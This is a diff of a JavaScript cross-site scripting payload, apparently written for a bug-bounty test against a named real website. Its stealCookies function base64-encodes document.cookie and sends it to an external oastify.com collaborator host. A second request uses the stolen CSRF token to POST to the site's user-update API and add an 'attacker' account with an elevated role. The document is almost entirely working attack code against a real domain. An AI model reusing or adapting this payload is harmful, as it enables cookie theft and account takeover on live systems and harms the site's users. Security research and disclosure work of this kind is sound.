@@ -1,8 +1,8 @@
 alert(document.cookie);
 alert(document.domain);
 function stealCookies(){
-  const url = 'http://bcrsweta3cja1n7ra673qlbvlmrdf93y.oastify.com/?cookies' + btoa(document.cookie)
-  const response = await fetch(url)
+  const url = 'http://bcrsweta3cja1n7ra673qlbvlmrdf93y.oastify.com/?cookies=' + btoa(document.cookie)
+  const response = fetch(url)
 }
 
 function getCookie(cname)
@@ -21,7 +21,7 @@ stealCookies();
 const csrfToken = getCookie("csrftoken");
 const addNew = '{"name":"attacker","email":"johnstone+attacker' + Math.floor(Math.random() * 1000) + '@wearehackerone.com","role_info_list":[{"type":2}],"operator_type":1}‘;
 // a POST request
-const response = await fetch('https://www.pangleglobal.com/media/api/user/update', {
+const response = fetch('https://www.pangleglobal.com/media/api/user/update', {
   method: 'POST',
   headers: {
 	'Content-Type': 'application/json; charset=utf-8',
